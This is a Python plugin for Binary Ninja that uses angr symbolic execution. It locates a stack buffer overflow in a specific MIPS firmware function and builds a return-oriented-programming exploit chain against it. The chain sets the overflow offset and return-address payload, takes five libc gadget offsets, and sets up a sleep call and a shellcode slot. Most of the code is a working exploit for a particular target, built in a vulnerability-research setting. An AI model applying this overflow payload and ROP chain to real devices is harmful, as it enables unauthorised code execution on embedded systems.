import angr
import string
import claripy
import archinfo
import tempfile
import sys
from binaryninja.highlight import HighlightColor
from binaryninja.enums import HighlightStandardColor, MessageBoxButtonSet, MessageBoxIcon
from binaryninja.plugin import PluginCommand, BackgroundTaskThread, BackgroundTask
import binaryninja.interaction as interaction
import binaryninja as binja
from binaryninja import BinaryView, SectionSemantics
import os
import collections
from pwn import *

BinaryView.set_default_session_data("find_list", set())

registers = ['a0', 'a1', 'a2', 'a3', 's0', 's1',
             's2', 's3', 's4', 's5', 's6', 's7',
             't0', 't1', 't2', 't3', 't4', 't5',
             't6', 't7', 't8', 't9', 'v0', 'v1',
             'sp', 'gp', 'pc', 'ra', 'fp']

state_history = collections.OrderedDict()


class AngrRunner(BackgroundTaskThread):
    def __init__(self, bv, exploit=False):
        BackgroundTaskThread.__init__(
            self, "Vulnerability research with angr started...", can_cancel=True)
        self.bv = bv
        self.exploit = exploit

    def run(self):
        if(self.exploit):
            build_ROP(self.bv)
        else:
            find_vuln(self.bv)

    @classmethod
    def cancel(self, bv):
        for addr in bv.session_data.find_list:
            blocks = bv.get_basic_blocks_at(addr)
            for block in blocks:
                block.set_auto_highlight(HighlightColor(
                    HighlightStandardColor.NoHighlightColor, alpha=128))
                block.function.set_auto_instr_highlight(
                    addr, HighlightStandardColor.NoHighlightColor)


class BackgroundTaskManager():
    def __init__(self, bv):
        self.runner = None

    @classmethod
    def solve(self, bv):
        self.runner = AngrRunner(bv)
        self.runner.start()

    @classmethod
    def build_exploit(self, bv):
        self.runner = AngrRunner(bv, exploit=True)
        self.runner.start()

    @classmethod
    def stop(self, bv):
        self.runner.cancel(bv)


def dump_regs(state, registers, *include):
    data = []
    if(len(include) > 0):
        data = [x for x in registers if x in include]
    else:
        data = registers
    for reg in data:
        binja.log_info("${0}: {1}".format(reg, state.regs.get(reg)))


def find_instr(bv, addr):
    # Highlight the instruction in green
    blocks = bv.get_basic_blocks_at(addr)
    bv.session_data.find_list.add(addr)
    for block in blocks:
        block.set_auto_highlight(HighlightColor(
            HighlightStandardColor.GreenHighlightColor, alpha=128))
        block.function.set_auto_instr_highlight(
            addr, HighlightStandardColor.GreenHighlightColor)


def find_vuln(bv):

    def get_vuln_report(report):
        contents = "==== Vulnerability Report ====\r\n\n"
        for key, value in report.items():
            if(key == 'ra'):
                contents += "[*] Buffer overflow detected !!!\r\n\n"
                contents += "We can control ${0} after {1} bytes !!!!\r\n\n".format(
                    key, value)
            else:
                contents += "Register ${0} overwritten after {1} bytes !!!!\r\n\n".format(
                    key, value)
        return contents

    def identify_overflow(found, registers=[], silence=True, *exclude):
        data = []
        report = {}
        if(len(exclude) > 0):
            data = [x for x in registers if x not in exclude]
        else:
            data = registers
        for arg in data:
            reg = found.solver.eval(found.regs.get(arg), cast_to=bytes)
            if reg in init:
                if(arg == 'ra' and cyclic_find(reg.decode())):
                    binja.log_warn("[*] Buffer overflow detected !!!")
                    binja.log_warn(
                        "[*] We can control ${0} after {1} bytes !!!!".format(arg, cyclic_find(reg.decode())))
                    report[arg] = cyclic_find(reg.decode())
                else:
                    binja.log_warn(
                        "[+] Register ${0} overwritten after: {1} bytes".format(arg, cyclic_find(reg.decode())))
                    report[arg] = cyclic_find(reg.decode())
            else:
                if(not silence):
                    binja.log_info(
                        "[-] Register ${0} not overwrite by pattern".format(arg))
        if(bool(report)):
            interaction.show_markdown_report(
                "Vulnerability Info Report", get_vuln_report(report))

    proj = angr.Project(bv.file.filename, ld_path=[
                        '/home/horac/Research/firmware/poc/fmk/rootfs/lib'], use_system_libs=False)
    cfg = proj.analyses.CFGFast(regions=[(0x4703f0, 0x4706fc)])

    init = cyclic(300).encode()
    arg0 = angr.PointerWrapper(init)
    state = proj.factory.call_state(0x4703f0, arg0)
    simgr = proj.factory.simgr(state)

    @proj.hook(0x4706fc, length=0)
    def test(state):
        find_instr(bv, state.solver.eval(state.regs.pc, cast_to=int))
        if state.solver.eval(state.regs.pc, cast_to=int) == 0x4706fc:
            dump_regs(state, registers)
            return True

    sm = simgr.explore(find=test)
    test = sm.found
    if len(test) > 0:
        print(sm.found)
        found = sm.found[0]
        print("found", found)
        identify_overflow(found, registers)


def build_ROP(bv):

    def get_rop_report(state, data, gadget):
        contents = "==== 0x{0:0x} Data ====\r\n\n".format(gadget)
        for reg in data:
            contents += "${0}: 0x{1:0x}\r\n\n".format(
                reg, state.solver.eval(state.regs.get(reg), cast_to=int))
        return contents

    def stack_adjust(state, reg, size, data="EEEE", vector_size=32):
        if(size > 0):
            for i in range(4, size+4, 4):
                state.memory.store(reg+i, state.solver.BVV(data, 32))

    def find_instr(bv, addr):
        # Highlight the instruction in green
        blocks = bv.get_basic_blocks_at(addr)
        bv.session_data.find_list.add(addr)
        for block in blocks:
            block.set_auto_highlight(HighlightColor(
                HighlightStandardColor.GreenHighlightColor, alpha=128))
            block.function.set_auto_instr_highlight(
                addr, HighlightStandardColor.GreenHighlightColor)

    proj = angr.Project(bv.file.filename, ld_path=[
                        '/home/horac/Research/firmware/poc/fmk/rootfs/lib'], use_system_libs=False)
    libc = proj.loader.shared_objects['libc.so.0']
    libc_base = libc.min_addr
    end_addr = 0x4706fc
    cfg = proj.analyses.CFGFast(regions=[(0x4703f0, end_addr)])

    # Gadget addresses

    gadget1 = libc_base+0x00055c60
    # addiu $a0, $zero, 1
    # move $t9, $s1
    # jalr $t9
    gadget2 = libc_base+0x00024ecc
    # lw $ra, 0x2c($sp)
    # lw $s1, 0x28($sp)
    # lw $s0, 0x24($sp)
    # jr $ra
    gadget3 = libc_base+0x0001e20c
    # move $t9, $s1
    # lw $ra, 0x24($sp)
    # lw $s2, 0x20($sp)
    # lw $s1, 0x1c($sp)
    # lw $s0, 0x18($sp)
    # jr $t9
    gadget4 = libc_base+0x000195f4
    # addiu $s0, $sp, 0x24
    # move $a0, $s0
    # move $t9, $s1
    # jalr $t9
    gadget5 = libc_base+0x000154d8
    # move $t9, $s0
    # jalr $t9
    sleep = libc_base + 0x00053ca0

    # Prepare initial state for vulnerable function

    init = b"A"*160 + b"BBBB"+p32(gadget2, endian='big')
    arg0 = angr.PointerWrapper(init)
    state = proj.factory.call_state(0x4703f0, arg0)
    simgr = proj.factory.simgr(state)
    binja.log_info("Gadget 1 address: 0x{0:0x}".format(gadget1))
    binja.log_info("Gadget 2 address: 0x{0:0x}".format(gadget2))
    binja.log_info("Gadget 3 address: 0x{0:0x}".format(gadget3))
    binja.log_info("Sleep func address: 0x{0:0x}".format(sleep))
    binja.log_info("Gadget 4 address: 0x{0:0x}".format(gadget4))
    binja.log_info("Gadget 5 address: 0x{0:0x}".format(gadget5))

    @proj.hook(end_addr, length=0)
    def overwrite_ra(state):
        pc = state.solver.eval(state.regs.pc, cast_to=int)
        find_instr(bv, pc)
        if pc == end_addr:
            state.regs.ra = gadget1
            state_history['init'] = state

    @proj.hook(gadget1, length=0)
    def hook_gadget1(state):
        pc = state.solver.eval(state.regs.pc, cast_to=int)
        if pc == gadget1:
            state_history[hex(gadget1)] = state

    @proj.hook(gadget2, length=0)  # jalr $t9
    def hook_gadget2(state):
        pc = state.solver.eval(state.regs.pc, cast_to=int)
        if pc == gadget2:
            sp = state.solver.eval(state.regs.sp, cast_to=int)
            stack_adjust(state, sp, 0x24, "EEEE")
            # lw $ra, 0x2c($sp)
            state.memory.store(sp+0x2c, state.solver.BVV(gadget3, 32))
            state_history[hex(gadget2)] = state

    @proj.hook(gadget2+4, length=0)  # lw $s1, 0x28($sp)
    def hook_gadget2next4(state):
        pc = state.solver.eval(state.regs.pc, cast_to=int)
        if pc == gadget2+4:
            sp = state.solver.eval(state.regs.sp, cast_to=int)
            # lw $s1, 0x28($sp)
            state.memory.store(sp+0x28, state.solver.BVV(sleep, 32))

    @proj.hook(gadget2+8, length=0)  # lw $s0, 0x24($sp)
    def hook_gadget2next8(state):
        pc = state.solver.eval(state.regs.pc, cast_to=int)
        if pc == gadget2+8:
            sp = state.solver.eval(state.regs.sp, cast_to=int)
            # lw $s0 0x24($sp)
            state.memory.store(sp+0x24, state.solver.BVV("DDDD", 32))

    @proj.hook(gadget3, length=0)  # mov $t9, $s1
    def hook_gadget3(state):
        pc = state.solver.eval(state.regs.pc, cast_to=int)
        if pc == gadget3:
            sp = state.solver.eval(state.regs.sp, cast_to=int)
            stack_adjust(state, sp, 0x14, "GGGG")
            # gadget3 -> lw $s0, 0x18($sp) => 24 bytes
            state.memory.store(sp+0x18, state.solver.BVV("GGGG", 32))
            state_history[hex(gadget3)] = state

    @proj.hook(gadget3+4, length=0)  # lw $ra, 0x24($sp)
    def hook_gadget3next4(state):
        pc = state.solver.eval(state.regs.pc, cast_to=int)
        if pc == gadget3+4:
            sp = state.solver.eval(state.regs.sp, cast_to=int)
            # lw $ra, 0x24($sp)
            state.memory.store(sp+0x24, state.solver.BVV(gadget4, 32))

    @proj.hook(gadget3+8, length=0)  # lw $s2, 0x20($sp)
    def hook_gadget3next8(state):
        pc = state.solver.eval(state.regs.pc, cast_to=int)
        if pc == gadget3+8:
            sp = state.solver.eval(state.regs.sp, cast_to=int)
            # lw $s2, 0x20($sp)
            state.memory.store(sp+0x20, state.solver.BVV("EEEE", 32))

    @proj.hook(gadget3+12, length=0)  # lw $s1, 0x1c($sp)
    def hook_gadget3next12(state):
        pc = state.solver.eval(state.regs.pc, cast_to=int)
        if pc == gadget3+12:
            sp = state.solver.eval(state.regs.sp, cast_to=int)
            # lw $s1, 0x1c($sp)
            state.memory.store(sp+0x1c, state.solver.BVV(gadget5, 32))

    @proj.hook(gadget3+16, length=0)  # lw $s0, 0x18($sp)
    def hook_gadget3next16(state):
        pc = state.solver.eval(state.regs.pc, cast_to=int)
        if pc == gadget3+16:
            sp = state.solver.eval(state.regs.sp, cast_to=int)
            # lw $s0, 0x18($sp)
            state.memory.store(sp+0x18, state.solver.BVV("FFFF", 32))

    @proj.hook(gadget4, length=0)  # addiu $s0, $sp, 0x24
    def hook_gadget4(state):
        pc = state.solver.eval(state.regs.pc, cast_to=int)
        if pc == gadget4:
            sp = state.solver.eval(state.regs.sp, cast_to=int)
            # addiu $s0, $sp, 0x24
            state.memory.store(sp+0x24, state.solver.BVV("SHEL", 32))
            state_history[hex(gadget4)] = state

    @proj.hook(gadget5+4, length=0)  # jalr $t9
    def exploit(state):
        pc = state.solver.eval(state.regs.pc, cast_to=int)
        if pc == gadget5+4:
            return True

    sm = simgr.explore(find=exploit)
    test = sm.found
    if len(test) > 0:
        print(sm.found)
        found = sm.found[0]
        print("found", found)
        dump_regs(found, registers)

        # Generate raport for gadgets

        interaction.show_markdown_report("Initial State", get_rop_report(
            state_history['init'], registers, end_addr))
        interaction.show_markdown_report("ROP Gadget 1", get_rop_report(
            state_history[hex(gadget1)], registers, gadget1))
        interaction.show_markdown_report("ROP Gadget 2", get_rop_report(
            state_history[hex(gadget2)], registers, gadget2))
        interaction.show_markdown_report("ROP Gadget 3", get_rop_report(
            state_history[hex(gadget3)], registers, gadget3))
        interaction.show_markdown_report("ROP Gadget 4", get_rop_report(
            state_history[hex(gadget4)], registers, gadget4))
        interaction.show_markdown_report("ROP Gadget 5", get_rop_report(
            found, registers, found.solver.eval(found.regs.pc, cast_to=int)))
        state_history[hex(gadget5)] = found


PluginCommand.register(
    "Angr\PoC\Solve", "Attempt to solve for a path that satisfies the constraints given", BackgroundTaskManager.solve)
PluginCommand.register("Angr\Poc\Build ROP",
                       "Try to build exploit rop chain", BackgroundTaskManager.build_exploit)
PluginCommand.register(
    "Angr\PoC\Clear", "Clear angr path traversed blocks", BackgroundTaskManager.stop)
